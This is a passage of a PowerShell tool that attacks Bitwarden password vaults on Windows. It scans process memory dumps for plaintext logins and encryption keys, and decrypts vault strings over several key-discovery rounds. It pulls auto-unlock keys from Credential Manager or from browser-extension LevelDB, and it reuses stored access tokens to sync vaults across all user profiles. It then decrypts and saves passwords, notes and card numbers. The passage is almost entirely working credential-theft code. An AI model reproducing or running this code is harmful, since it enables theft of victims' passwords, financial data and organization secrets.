            if ($cred.Username) { Write-Host "      User: $($cred.Username)" -ForegroundColor Cyan }
            if ($cred.Password) { Write-Host "      Pass: $($cred.Password)" -ForegroundColor Yellow }
        }
        Write-Host ""
    }

    if ($allUniqueValues.Count -gt 0) {
        Write-Status "ALL DECRYPTED VALUES ($($allUniqueValues.Count) unique)" "header"
        $vi = 0
        foreach ($val in $allUniqueValues) {
            $vi++
            $color = "White"
            if ($val -match '^https?://') { $color = "Gray" }
            elseif ($val -match '@') { $color = "Cyan" }
            elseif ($val.Length -ge 6 -and $val -match '[A-Z]' -and $val -match '[a-z]' -and $val -match '\d') { $color = "Yellow" }
            Write-Host "  [$vi] $val" -ForegroundColor $color
        }
        Write-Host ""
    }

    # Summary
    foreach ($cr in $allCryptoDecrypted) {
        Write-Status "Crypto summary: $($cr.Decrypted.Count)/$($cr.Total) decrypted, $($cr.Remaining) remaining" "info"
    }

    # Save all results
    $allCreds = @()
    $allCreds += $allCipherCreds
    $allCreds += $plaintextCreds
    foreach ($val in $allUniqueValues) {
        $isUrl = $val -match '^https?://'
        $isEmail = $val -match '@'
        $allCreds += [PSCustomObject]@{
            Name = ""; URL = $(if ($isUrl) { $val } else { "" })
            Username = $(if ($isEmail) { $val } else { "" })
            Password = $(if (-not $isUrl -and -not $isEmail) { $val } else { "" })
        }
    }
    $allCreds = @($allCreds | Sort-Object { "$($_.Username)|$($_.Password)" } -Unique)
    if ($allCreds.Count -gt 0) {
        Save-Results -Credentials $allCreds -OutputFile $OutFile
    } elseif ($plaintextCreds.Count -eq 0 -and $allUniqueValues.Count -eq 0) {
        Write-Status "No credentials found in process memory" "warn"
    }
}

function Find-CredentialPatterns {
    param([string]$Text, [ref]$Credentials)

    # Bitwarden cipher JSON in memory: extract username/password/uri from decrypted vault items
    $jsonPattern = '"username"\s*:\s*"([^"]{1,200})"\s*,\s*"password"\s*:\s*"([^"]{1,500})"'
    $matches2 = [regex]::Matches($Text, $jsonPattern, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
    foreach ($m in $matches2) {
        $user = $m.Groups[1].Value
        $pass = $m.Groups[2].Value
        # Skip encrypted EncStrings (including JSON-escaped unicode like + for +)
        if ($user -match '^\d\.[A-Za-z0-9+/=\\]{10,}' -or $pass -match '^\d\.[A-Za-z0-9+/=\\]{10,}') { continue }
        if ($pass.Length -gt 1 -and $user.Length -gt 1) {
            # Search surrounding context for uri and name (within 4000 chars before and 500 after)
            $ctxStart = [Math]::Max(0, $m.Index - 4000)
            $ctxEnd = [Math]::Min($Text.Length, $m.Index + $m.Length + 500)
            $context = $Text.Substring($ctxStart, $ctxEnd - $ctxStart)
            $urlMatch = [regex]::Match($context, '"uri"\s*:\s*"([^"]{5,500})"', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
            $nameMatch = [regex]::Match($context, '"name"\s*:\s*"([^"]{1,100})"', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
            $nameVal = ""
            if ($nameMatch.Success) {
                $n = $nameMatch.Groups[1].Value
                if ($n -notmatch '^\d\.[A-Za-z0-9+/=]') { $nameVal = $n }
            }
            $urlVal = ""
            if ($urlMatch.Success) { $urlVal = $urlMatch.Groups[1].Value }
            elseif ($nameVal -match '^\w[\w.-]+\.\w{2,}$') { $urlVal = "https://$nameVal" }
            $Credentials.Value += [PSCustomObject]@{
                Name     = $nameVal
                URL      = $urlVal
                Username = $user
                Password = $pass
            }
        }
    }

    # URL + credential proximity: restrict URL to valid URL chars (stop at JSON delimiters)
    $urlCredsPattern = '(https?://[A-Za-z0-9_.~:/?#\[\]@!$&''()*+,;=%-]{5,300})\s{1,50}([\w.+-]+@[\w.-]+\.\w{2,})\s{1,50}([^\s"''<>{}\[\]]{4,100})'
    $matches3 = [regex]::Matches($Text, $urlCredsPattern)
    foreach ($m in $matches3) {
        $url = $m.Groups[1].Value.TrimEnd('.,;')
        $pass = $m.Groups[3].Value.TrimEnd('.,;')
        # Skip if this looks like JSON structure (already handled by JSON pattern above)
        if ($pass -match '^[,{}\[\]":]' -or $url -match '"[,}:\[]') { continue }
        $Credentials.Value += [PSCustomObject]@{
            Name = ""; URL = $url
            Username = $m.Groups[2].Value.Trim(); Password = $pass
        }
    }
}

function Invoke-BWParseDump {
    param([string]$DumpFile, [string]$OutFile)
    Write-Status "PARSE DUMP FILE" "header"
    if (-not (Test-Path $DumpFile)) {
        Write-Status "Dump file not found: $DumpFile" "bad"
        return
    }
    $fileSize = (Get-Item $DumpFile).Length
    Write-Status "Parsing: $DumpFile ($([math]::Round($fileSize / 1MB, 1))MB)" "info"

    # ── Phase 0: plaintext scan (existing) ──────────────────────────────
    Write-Status "PHASE 0: Plaintext Credential Scan" "header"
    $credentials = @()
    $chunkSize = 10MB
    $overlap = 4096
    $stream = [System.IO.File]::OpenRead($DumpFile)
    $position = 0
    while ($position -lt $fileSize) {
        $readSize = [int][Math]::Min($chunkSize + $overlap, $fileSize - $position)
        $buffer = New-Object byte[] $readSize
        $stream.Position = $position
        $bytesRead = $stream.Read($buffer, 0, $readSize)
        if ($bytesRead -eq 0) { break }
        $text = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead)
        Find-CredentialPatterns -Text $text -Credentials ([ref]$credentials)
        $text16 = [System.Text.Encoding]::Unicode.GetString($buffer, 0, $bytesRead)
        Find-CredentialPatterns -Text $text16 -Credentials ([ref]$credentials)
        $position += $chunkSize
    }
    $stream.Close()

    $encStrRe = '^\d\.[A-Za-z0-9+/=\\]{10,}'
    $filtered = $credentials | Where-Object {
        $_.Username -notmatch $encStrRe -and $_.Password -notmatch $encStrRe -and
        $_.Password.Length -lt 300 -and $_.Username.Length -lt 200
    }
    $plaintextCreds = @($filtered | Sort-Object { "$($_.Username)|$($_.Password)" } -Unique)
    if ($plaintextCreds.Count -gt 0) {
        Write-Status "Found $($plaintextCreds.Count) plaintext credential(s)" "good"
    } else {
        Write-Status "No plaintext credentials (vault likely locked)" "info"
    }

    # ── Phase 1: EncString extraction ───────────────────────────────────
    Write-Status "PHASE 1: EncString Extraction" "header"
    $logAction = [System.Action[string]]{ param($msg) Write-Status $msg "info" }
    $encStrings = [BW.DumpCrypto]::ExtractEncStrings($DumpFile)
    Write-Status "Extracted $($encStrings.Count) unique EncStrings" $(if ($encStrings.Count -gt 0) {"good"} else {"warn"})

    if ($encStrings.Count -eq 0) {
        Write-Status "No EncStrings found — cannot perform crypto extraction" "warn"
        if ($plaintextCreds.Count -gt 0) {
            Write-Status "EXTRACTED CREDENTIALS (plaintext only)" "header"
            $i = 0
            foreach ($cred in $plaintextCreds) {
                $i++
                Write-Host ""
                Write-Host "  [$i] " -NoNewline -ForegroundColor Green
                if ($cred.Name) { Write-Host "$($cred.Name) " -ForegroundColor White -NoNewline; Write-Host "(Memory)" -ForegroundColor DarkGray } else { Write-Host "" }
                if ($cred.URL) { Write-Host "      URL:  $($cred.URL)" -ForegroundColor Gray }
                if ($cred.Username) { Write-Host "      User: $($cred.Username)" -ForegroundColor Cyan }
                if ($cred.Password) { Write-Host "      Pass: $($cred.Password)" -ForegroundColor Yellow }
            }
            Save-Results -Credentials $plaintextCreds -OutputFile $OutFile
        }
        return
    }

    # ── Phase 2: Crypto key discovery ───────────────────────────────────
    Write-Status "PHASE 2: Crypto Key Discovery" "header"
    $allDecrypted = [System.Collections.Generic.List[object]]::new()
    $remaining = $encStrings
    $keyRound = 0
    $previousMacKey = $null

    while ($remaining.Count -ge 2) {
        $keyRound++
        $keyLabel = "Key#$keyRound"
        Write-Status "Searching for $keyLabel ($($remaining.Count) EncStrings)..." "info"

        $foundKey = $null
        if ($keyRound -eq 1) {
            $foundKey = [BW.DumpCrypto]::FindKeys($DumpFile, $remaining, $logAction)
        } else {
            $foundKey = [BW.DumpCrypto]::FindAdditionalKey($DumpFile, $remaining, $previousMacKey, $logAction)
        }

        if (-not $foundKey) {
            Write-Status "No more keys found ($($remaining.Count) EncStrings undecryptable)" "warn"
            break
        }

        $previousMacKey = $foundKey.MacKey
        Write-Status "$keyLabel found!" "good"
        Write-Status "  encKey offset: $($foundKey.EncKeyOffset)" "info"
        Write-Status "  macKey offset: $($foundKey.MacKeyOffset)" "info"
        Write-Status "  encKey: $([Convert]::ToBase64String($foundKey.EncKey))" "info"
        Write-Status "  macKey: $([Convert]::ToBase64String($foundKey.MacKey))" "info"
        Write-Status "  Matching EncStrings: $($foundKey.MatchedEncStrings)" "info"

        # ── Phase 3: Decryption with found key ─────────────────────────
        Write-Status "PHASE 3: Decryption (round $keyRound)" "header"
        $roundResults = [BW.DumpCrypto]::DecryptAll($remaining, $foundKey.EncKey, $foundKey.MacKey, $keyLabel, $logAction)
        foreach ($entry in $roundResults) { $allDecrypted.Add($entry) }
        $remaining = [BW.DumpCrypto]::GetRemaining($remaining, $roundResults)
        Write-Status "Round $keyRound complete: $($roundResults.Count) decrypted, $($remaining.Count) remaining" "info"

        if ($keyRound -ge 5) { break }
    }

    # ── Phase 4: Extract cipher JSON for structured output ──────────────
    Write-Status "PHASE 4: Results" "header"
    $decryptedValues = @{}
    $perItemKeyB64s = @()
    foreach ($entry in $allDecrypted) {
        if ($entry.IsPerItemKey) {
            $perItemKeyB64s += $entry.Plaintext
        } else {
            if ($entry.Plaintext -and $entry.Plaintext.Length -gt 0 -and $entry.Plaintext.Length -lt 1000) {
                $decryptedValues[$entry.EncString] = $entry.Plaintext
            }
        }
    }
    $uniqueValues = @($decryptedValues.Values | Sort-Object -Unique | Where-Object { $_.Trim().Length -gt 0 })

    # Try to extract cipher JSON structures for field association
    $cipherCreds = @()
    $cipherJsonRe = [regex]::new('"id"\s*:\s*"[0-9a-f-]{36}"[^{}]{0,500}"login"\s*:\s*\{[^{}]{0,2000}\}', [System.Text.RegularExpressions.RegexOptions]::Compiled)
    $nameRe  = [regex]::new('"name"\s*:\s*"(2\.[^"]+)"')
    $userRe  = [regex]::new('"username"\s*:\s*"(2\.[^"]+)"')
    $passRe  = [regex]::new('"password"\s*:\s*"(2\.[^"]+)"')
    $uriRe   = [regex]::new('"uri"\s*:\s*"(2\.[^"]+)"')
    $stream2 = [System.IO.File]::OpenRead($DumpFile)
    $position = 0
    while ($position -lt $fileSize) {
        $readSize = [int][Math]::Min(10MB + 8192, $fileSize - $position)
        $buf = New-Object byte[] $readSize
        $stream2.Position = $position
        $br = $stream2.Read($buf, 0, $readSize)
        if ($br -eq 0) { break }
        $chunk = [System.Text.Encoding]::ASCII.GetString($buf, 0, $br)
        foreach ($cm in $cipherJsonRe.Matches($chunk)) {
            $cj = $cm.Value
            $nm = $nameRe.Match($cj); $um = $userRe.Match($cj); $pm = $passRe.Match($cj); $urlm = $uriRe.Match($cj)
            if ($pm.Success -or $um.Success) {
                $cipherCreds += [PSCustomObject]@{
                    Name     = if ($nm.Success -and $decryptedValues.ContainsKey($nm.Groups[1].Value)) { $decryptedValues[$nm.Groups[1].Value] } else { "" }
                    URL      = if ($urlm.Success -and $decryptedValues.ContainsKey($urlm.Groups[1].Value)) { $decryptedValues[$urlm.Groups[1].Value] } else { "" }
                    Username = if ($um.Success -and $decryptedValues.ContainsKey($um.Groups[1].Value)) { $decryptedValues[$um.Groups[1].Value] } else { "" }
                    Password = if ($pm.Success -and $decryptedValues.ContainsKey($pm.Groups[1].Value)) { $decryptedValues[$pm.Groups[1].Value] } else { "" }
                }
            }
        }
        $position += 10MB
    }
    $stream2.Close()

    # ── Output ──────────────────────────────────────────────────────────
    Write-Status "EXTRACTED CREDENTIALS" "header"
    Write-Host ""
    Write-Status "Total EncStrings: $($encStrings.Count)" "info"
    Write-Status "Decrypted: $($allDecrypted.Count)" "good"
    Write-Status "Per-item keys: $($perItemKeyB64s.Count)" "info"
    Write-Status "Unique plaintext values: $($uniqueValues.Count)" "info"
    Write-Status "Remaining encrypted: $($remaining.Count)" "warn"
    Write-Host ""

    # Show structured cipher creds first
    if ($cipherCreds.Count -gt 0) {
        Write-Status "STRUCTURED CREDENTIALS (from cipher JSON)" "header"
        $i = 0
        foreach ($cred in $cipherCreds) {
            $i++
            Write-Host ""
            Write-Host "  [$i] " -NoNewline -ForegroundColor Green
            if ($cred.Name) { Write-Host "$($cred.Name) " -ForegroundColor White -NoNewline; Write-Host "(Decrypted)" -ForegroundColor DarkGray } else { Write-Host "" }
            if ($cred.URL) { Write-Host "      URL:  $($cred.URL)" -ForegroundColor Gray }
            if ($cred.Username) { Write-Host "      User: $($cred.Username)" -ForegroundColor Cyan }
            if ($cred.Password) { Write-Host "      Pass: $($cred.Password)" -ForegroundColor Yellow }
        }
        Write-Host ""
    }

    # Show plaintext memory creds
    if ($plaintextCreds.Count -gt 0) {
        Write-Status "PLAINTEXT CREDENTIALS (from memory)" "header"
        $i = 0
        foreach ($cred in $plaintextCreds) {
            $i++
            Write-Host ""
            Write-Host "  [$i] " -NoNewline -ForegroundColor Green
            if ($cred.Name) { Write-Host "$($cred.Name) " -ForegroundColor White -NoNewline; Write-Host "(Memory)" -ForegroundColor DarkGray } else { Write-Host "" }
            if ($cred.URL) { Write-Host "      URL:  $($cred.URL)" -ForegroundColor Gray }
            if ($cred.Username) { Write-Host "      User: $($cred.Username)" -ForegroundColor Cyan }
            if ($cred.Password) { Write-Host "      Pass: $($cred.Password)" -ForegroundColor Yellow }
        }
        Write-Host ""
    }

    # Show all unique decrypted values
    Write-Status "ALL DECRYPTED VALUES ($($uniqueValues.Count) unique)" "header"
    $vi = 0
    foreach ($val in $uniqueValues) {
        $vi++
        $color = "White"
        if ($val -match '^https?://') { $color = "Gray" }
        elseif ($val -match '@') { $color = "Cyan" }
        elseif ($val.Length -ge 6 -and $val -match '[A-Z]' -and $val -match '[a-z]' -and $val -match '\d') { $color = "Yellow" }
        Write-Host "  [$vi] $val" -ForegroundColor $color
    }
    Write-Host ""

    # Save all results
    $allCreds = @()
    $allCreds += $cipherCreds
    $allCreds += $plaintextCreds
    foreach ($val in $uniqueValues) {
        $isUrl = $val -match '^https?://'
        $isEmail = $val -match '@'
        $allCreds += [PSCustomObject]@{
            Name = ""; URL = $(if ($isUrl) { $val } else { "" })
            Username = $(if ($isEmail) { $val } else { "" })
            Password = $(if (-not $isUrl -and -not $isEmail) { $val } else { "" })
        }
    }
    $allCreds = @($allCreds | Sort-Object { "$($_.Username)|$($_.Password)" } -Unique)
    if ($allCreds.Count -gt 0) {
        Save-Results -Credentials $allCreds -OutputFile $OutFile
    }

    # Save detailed report
    $reportPath = [System.IO.Path]::ChangeExtension($OutFile, ".detail.txt")
    $report = [System.Text.StringBuilder]::new()
    [void]$report.AppendLine("=== BITWARDEN DUMP DECRYPTION REPORT ===")
    [void]$report.AppendLine("Dump: $DumpFile ($([math]::Round($fileSize / 1MB, 1))MB)")
    [void]$report.AppendLine("EncStrings: $($encStrings.Count)")
    [void]$report.AppendLine("Decrypted: $($allDecrypted.Count)")
    [void]$report.AppendLine("Per-item keys: $($perItemKeyB64s.Count)")
    [void]$report.AppendLine("Remaining: $($remaining.Count)")
    [void]$report.AppendLine("")
    [void]$report.AppendLine("--- DECRYPTED VALUES ---")
    foreach ($entry in $allDecrypted) {
        if (-not $entry.IsPerItemKey) {
            [void]$report.AppendLine("  [$($entry.KeySource)] $($entry.Plaintext)")
        }
    }
    [void]$report.AppendLine("")
    [void]$report.AppendLine("--- STILL ENCRYPTED ($($remaining.Count)) ---")
    foreach ($enc in $remaining) {
        [void]$report.AppendLine("  $($enc.Substring(0, [Math]::Min(80, $enc.Length)))...")
    }
    try { [System.IO.File]::WriteAllText($reportPath, $report.ToString()) } catch {}
    Write-Status "Detailed report: $reportPath" "info"
}

# ============================================================================
#  Offline Decrypt Mode
# ============================================================================

function Invoke-BWOffline {
    param([string]$ApiBaseUrl, [string]$OutFile)

    Write-Status "OFFLINE VAULT DECRYPTION" "header"

    # --- Step 1: Find the UserKey ---
    Write-Status "STEP 1: Locate UserKey" "header"
    $userKeyBytes = $null
    $userKeySource = ""

    # Try Credential Manager first (desktop app)
    $credEntries = @()
    foreach ($filter in @("Bitwarden*", "bitwarden*")) {
        try { $credEntries += [BW.CredMgr]::Enumerate($filter) } catch {}
    }
    $autoKeyCreds = $credEntries | Where-Object { $_.TargetName -match 'auto' }
    foreach ($akc in $autoKeyCreds) {
        Write-Status "Found auto-unlock credential: $($akc.TargetName)" "good"
        $b64 = $null
        $candidates = @()
        if ($akc.BlobAsUtf16) { $candidates += $akc.BlobAsUtf16.TrimEnd("`0").Trim('"') }
        if ($akc.BlobAsUtf8)  { $candidates += $akc.BlobAsUtf8.TrimEnd("`0").Trim('"') }
        foreach ($c in $candidates) {
            if ($c -match '^[A-Za-z0-9+/=]{44,}$') { $b64 = $c; break }
        }
        if ($b64) {
            try {
                $userKeyBytes = [Convert]::FromBase64String($b64)
                if ($userKeyBytes.Length -ge 32) {
                    Write-Status "UserKey extracted from Credential Manager ($($userKeyBytes.Length) bytes)" "good"
                    $userKeySource = "CredentialManager"
                    break
                }
            } catch { Write-Verbose "Base64 decode failed for $($akc.TargetName)" }
        }
    }

    # Try browser extension LevelDB (plaintext in chrome.storage.local)
    if (-not $userKeyBytes) {
        Write-Status "Credential Manager empty, scanning browser extension LevelDB..." "warn"
        $extPaths = @{
            "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data"
            "Edge"    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        }
        $extIds = @{
            "Chrome"  = "nngceckbapebfimnlniiiahkandclblb"
            "Edge"    = "jbkfoedolllekgbhcbcoahefnbanhhlh"
        }
        foreach ($browser in $extPaths.Keys) {
            if ($userKeyBytes) { break }
            $userData = $extPaths[$browser]
            if (-not (Test-Path $userData)) { continue }
            $profiles = @("Default") + @(Get-ChildItem $userData -Directory -Filter "Profile *" -ErrorAction SilentlyContinue | ForEach-Object { $_.Name })
            foreach ($prof in $profiles) {
                $extPath = Join-Path $userData "$prof\Local Extension Settings\$($extIds[$browser])"
                if (-not (Test-Path $extPath)) { continue }
                $files = Get-ChildItem $extPath -File -ErrorAction SilentlyContinue |
                    Where-Object { $_.Extension -in @('.ldb', '.log', '.sst') }
                foreach ($f in $files) {
                    try {
                        $raw = [System.IO.File]::ReadAllBytes($f.FullName)
                        $text = [System.Text.Encoding]::UTF8.GetString($raw)
                        $idx = $text.IndexOf('_user_auto')
                        if ($idx -ge 0) {
                            $searchArea = $text.Substring([Math]::Max(0, $idx - 100), [Math]::Min(600, $text.Length - [Math]::Max(0, $idx - 100)))
                            $b64Matches = [regex]::Matches($searchArea, '[A-Za-z0-9+/]{60,}={0,2}')
                            foreach ($bm in $b64Matches) {
                                try {
                                    $decoded = [Convert]::FromBase64String($bm.Value)
                                    if ($decoded.Length -ge 32 -and $decoded.Length -le 128) {
                                        $userKeyBytes = $decoded
                                        $userKeySource = "LevelDB ($browser - $prof)"
                                        Write-Status "UserKey extracted from LevelDB: $browser ($($decoded.Length) bytes)" "good"
                                        break
                                    }
                                } catch {}
                            }
                        }
                    } catch {}
                    if ($userKeyBytes) { break }
                }
                if ($userKeyBytes) { break }
            }
        }
    }

    if (-not $userKeyBytes) {
        Write-Status "No UserKey found. Vault timeout is not 'Never' or auto-unlock is not configured." "bad"
        Write-Status "Try -Dump mode for memory extraction instead." "info"
        return
    }

    # Split UserKey into EncKey + MacKey
    $keyParts = Get-KeyParts -KeyBytes $userKeyBytes
    if (-not $keyParts) {
        Write-Status "Invalid UserKey (too short)" "bad"
        return
    }
    $encKey = $keyParts.EncKey
    $macKey = $keyParts.MacKey
    Write-Status "UserKey split: EncKey($($encKey.Length)B) + MacKey($($macKey.Length)B)" "info"

    # --- Step 2: Find encrypted vault data ---
    Write-Status "STEP 2: Locate Encrypted Vault Data" "header"
    $ciphers = @()
    $privateKeyEnc = $null
    $script:orgKeysEnc = @{}

    # Try data.json (desktop app) - modern flat key format
    $userProfiles = Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -notin @('Public', 'Default', 'Default User', 'All Users') }
    foreach ($profile in $userProfiles) {
        foreach ($djDir in @("Bitwarden", "Bitwarden CLI")) {
            $djPath = Join-Path $profile.FullName "AppData\Roaming\$djDir\data.json"
            if (-not (Test-Path $djPath)) { continue }
            Write-Status "Parsing $djPath..." "info"
            try {
                $json = Get-Content $djPath -Raw -ErrorAction Stop | ConvertFrom-Json
                $allProps = @{}
                $json.PSObject.Properties | ForEach-Object { $allProps[$_.Name] = $_.Value }

                # Find user IDs from modern format
                $userIds = @()
                if ($allProps.ContainsKey('global_account_activeAccountId')) {
                    $userIds += $allProps['global_account_activeAccountId']
                }
                $allProps.Keys | ForEach-Object {
                    if ($_ -match '^user_([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})_') {
                        if ($Matches[1] -notin $userIds) { $userIds += $Matches[1] }
                    }
                }
                # Legacy format: UUID as top-level key
                $allProps.Keys | ForEach-Object {
                    if ($_ -match '^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$') {
                        if ($_ -notin $userIds) { $userIds += $_ }
                    }
                }

                foreach ($uid in $userIds) {
                    # Modern format: encrypted private key in accountCryptographicState
                    $cryptoStateKey = "user_${uid}_crypto_accountCryptographicState"
                    if ($allProps.ContainsKey($cryptoStateKey)) {
                        $cs = $allProps[$cryptoStateKey]
                        if ($cs.PSObject.Properties['V1'] -and $cs.V1.PSObject.Properties['private_key']) {
                            $privateKeyEnc = $cs.V1.private_key
                            Write-Status "  Found encrypted RSA private key (V1 format)" "good"
                        }
                    }

                    # Modern format: ciphers
                    $ciphersKey = "user_${uid}_ciphers_ciphers"
                    if ($allProps.ContainsKey($ciphersKey) -and $allProps[$ciphersKey] -is [PSObject]) {
                        $allProps[$ciphersKey].PSObject.Properties | ForEach-Object {
                            $ciphers += $_.Value
                        }
                        Write-Status "  Found $($ciphers.Count) cached ciphers" "good"
                    }

                    # Organization keys (for org cipher decryption)
                    $orgKeysKey = "user_${uid}_crypto_organizationKeys"
                    if ($allProps.ContainsKey($orgKeysKey) -and $allProps[$orgKeysKey] -is [PSObject]) {
                        $script:orgKeysEnc = @{}
                        $allProps[$orgKeysKey].PSObject.Properties | ForEach-Object {
                            $script:orgKeysEnc[$_.Name] = $_.Value
                        }
                        Write-Status "  Found $($script:orgKeysEnc.Count) organization key(s)" "info"
                    }

                    # Legacy format fallback
                    if ($ciphers.Count -eq 0 -and $allProps.ContainsKey($uid)) {
                        $legacy = $allProps[$uid]
                        if ($legacy -is [PSObject]) {
                            if ($legacy.PSObject.Properties['data'] -and $legacy.data.PSObject.Properties['ciphers']) {
                                $cd = $legacy.data.ciphers
                                if ($cd.PSObject.Properties['encrypted']) {
                                    $cd.encrypted.PSObject.Properties | ForEach-Object { $ciphers += $_.Value }
                                }
                            }
                            if (-not $privateKeyEnc -and $legacy.PSObject.Properties['keys']) {
                                $pk = $legacy.keys
                                if ($pk.PSObject.Properties['privateKey']) {
                                    $privateKeyEnc = if ($pk.privateKey -is [PSObject] -and $pk.privateKey.PSObject.Properties['encrypted']) { $pk.privateKey.encrypted } else { $pk.privateKey }
                                }
                            }
                        }
                    }
                }
            } catch { Write-Verbose "Failed to parse data.json: $_" }
        }
    }

    # Try API sync if we have no cached ciphers
    if ($ciphers.Count -eq 0) {
        Write-Status "No cached ciphers in data.json, attempting API sync..." "warn"
        $accessToken = $null

        # Look for access token in data.json (modern format: user_{uid}_token_accessToken)
        foreach ($profile in $userProfiles) {
            if ($accessToken) { break }
            $djPath = Join-Path $profile.FullName "AppData\Roaming\Bitwarden\data.json"
            if (-not (Test-Path $djPath)) { continue }
            try {
                $json = Get-Content $djPath -Raw -ErrorAction Stop | ConvertFrom-Json
                $json.PSObject.Properties | ForEach-Object {
                    if ($_.Name -match 'token_accessToken$' -and $_.Value -is [string] -and $_.Value.Length -gt 20) {
                        $accessToken = $_.Value
                    }
                }
            } catch {}
        }

        if ($accessToken) {
            # Determine API URL: official Bitwarden uses api.bitwarden.com, self-hosted uses {url}/api
            $syncUrl = if ($ApiBaseUrl -match 'vault\.bitwarden\.com') {
                "https://api.bitwarden.com/sync"
            } else {
                "$ApiBaseUrl/api/sync"
            }
            Write-Status "Syncing vault from $syncUrl..." "info"
            try {
                $headers = @{ "Authorization" = "Bearer $accessToken" }
                $sync = Invoke-RestMethod -Uri $syncUrl -Headers $headers -Method Get -ErrorAction Stop
                if ($sync.ciphers) {
                    $ciphers = @($sync.ciphers)
                    if ($sync.profile -and $sync.profile.privateKey) {
                        $privateKeyEnc = $sync.profile.privateKey
                    }
                    Write-Status "Synced $($ciphers.Count) ciphers from API" "good"
                }
            } catch {
                Write-Status "API sync failed: $_ (token may be expired)" "bad"
            }
        } else {
            Write-Status "No access token found for API sync" "warn"
        }
    }

    if ($ciphers.Count -eq 0) {
        Write-Status "No ciphers found to decrypt" "bad"
        return
    }
    Write-Status "Found $($ciphers.Count) ciphers to decrypt" "info"

    # --- Step 3: Decrypt ---
    Write-Status "STEP 3: Decrypt Vault" "header"
    $decrypted = @()

    # Decrypt RSA private key (for org ciphers)
    $privateKeyDer = $null
    if ($privateKeyEnc) {
        $privateKeyDer = Decrypt-EncStringToBytes -EncString $privateKeyEnc -EncKey $encKey -MacKey $macKey
        if ($privateKeyDer) {
            Write-Status "RSA private key decrypted ($($privateKeyDer.Length) bytes)" "good"
        } else {
            Write-Status "Failed to decrypt RSA private key" "warn"
        }
    }

    # Pre-decrypt organization keys
    $orgKeys = @{}
    if ($privateKeyDer -and $script:orgKeysEnc) {
        foreach ($orgId in $script:orgKeysEnc.Keys) {
            $orgEntry = $script:orgKeysEnc[$orgId]
            $orgKeyEnc = $null
            if ($orgEntry -is [string]) { $orgKeyEnc = $orgEntry }
            elseif ($orgEntry -is [PSObject] -and $orgEntry.PSObject.Properties['key']) { $orgKeyEnc = $orgEntry.key }
            if ($orgKeyEnc) {
                $parsed = Split-EncString $orgKeyEnc
                if ($parsed -and $parsed.Type -eq 4) {
                    $ct = [Convert]::FromBase64String($parsed.CT)
                    $orgKeyBytes = Decrypt-RsaOaepSha1 -CT $ct -PrivateKeyDer $privateKeyDer
                    if ($orgKeyBytes) {
                        $orgKeys[$orgId] = Get-KeyParts -KeyBytes $orgKeyBytes
                        Write-Verbose "Decrypted org key for $orgId"
                    }
                }
            }
        }
        if ($orgKeys.Count -gt 0) {
            Write-Status "Decrypted $($orgKeys.Count) organization key(s)" "good"
        }
    }

    foreach ($cipher in $ciphers) {
        $cipherObj = if ($cipher -is [PSObject]) { $cipher } else { continue }
        $cipherType = 0
        if ($cipherObj.PSObject.Properties['type']) { $cipherType = $cipherObj.type }

        # Determine decryption key: cipher key > org key > UserKey
        $cEncKey = $encKey
        $cMacKey = $macKey
        if ($cipherObj.PSObject.Properties['key'] -and $cipherObj.key) {
            $cipherKeyBytes = Decrypt-EncStringToBytes -EncString $cipherObj.key -EncKey $encKey -MacKey $macKey
            if ($cipherKeyBytes) {
                $ckp = Get-KeyParts -KeyBytes $cipherKeyBytes
                if ($ckp) { $cEncKey = $ckp.EncKey; $cMacKey = $ckp.MacKey }
            }
        } elseif ($cipherObj.PSObject.Properties['organizationId'] -and $cipherObj.organizationId) {
            $oid = $cipherObj.organizationId
            if ($orgKeys.ContainsKey($oid)) {
                $cEncKey = $orgKeys[$oid].EncKey
                $cMacKey = $orgKeys[$oid].MacKey
            }
        }

        $name = ""
        if ($cipherObj.PSObject.Properties['name'] -and $cipherObj.name) {
            $name = Decrypt-EncString -EncString $cipherObj.name -EncKey $cEncKey -MacKey $cMacKey
        }

        $result = [PSCustomObject]@{ Name = $name; Type = $cipherType; URL = ""; Username = ""; Password = ""; Notes = ""; CardNumber = ""; }

        switch ($cipherType) {
            1 { # Login
                $login = $cipherObj.login
                if ($login) {
                    if ($login.PSObject.Properties['username'] -and $login.username) {
                        $result.Username = Decrypt-EncString -EncString $login.username -EncKey $cEncKey -MacKey $cMacKey
                    }
                    if ($login.PSObject.Properties['password'] -and $login.password) {
                        $result.Password = Decrypt-EncString -EncString $login.password -EncKey $cEncKey -MacKey $cMacKey
                    }
                    if ($login.PSObject.Properties['uris'] -and $login.uris) {
                        $uris = @()
                        foreach ($u in $login.uris) {
                            if ($u.PSObject.Properties['uri'] -and $u.uri) {
                                $decUri = Decrypt-EncString -EncString $u.uri -EncKey $cEncKey -MacKey $cMacKey
                                if ($decUri) { $uris += $decUri }
                            }
                        }
                        $result.URL = $uris -join ", "
                    }
                }
            }
            2 { # Secure Note
                if ($cipherObj.PSObject.Properties['notes'] -and $cipherObj.notes) {
                    $result.Notes = Decrypt-EncString -EncString $cipherObj.notes -EncKey $cEncKey -MacKey $cMacKey
                }
            }
            3 { # Card
                $card = $cipherObj.card
                if ($card) {
                    if ($card.PSObject.Properties['number'] -and $card.number) {
                        $result.CardNumber = Decrypt-EncString -EncString $card.number -EncKey $cEncKey -MacKey $cMacKey
                    }
                    if ($card.PSObject.Properties['code'] -and $card.code) {
                        $result.Password = Decrypt-EncString -EncString $card.code -EncKey $cEncKey -MacKey $cMacKey
                    }
                }
            }
        }

        if ($result.Name -or $result.Username -or $result.Password -or $result.Notes -or $result.CardNumber) {
            $decrypted += $result
        }
    }

    # Display results
    Write-Status "DECRYPTED VAULT" "header"
    if ($decrypted.Count -gt 0) {
        $i = 0
        $typeNames = @{ 1 = "Login"; 2 = "Note"; 3 = "Card"; 4 = "Identity" }
        foreach ($d in $decrypted) {
            $i++
            $tn = if ($typeNames.ContainsKey([int]$d.Type)) { $typeNames[[int]$d.Type] } else { "Item" }
            Write-Host ""
            Write-Host "  [$i] " -NoNewline -ForegroundColor Green
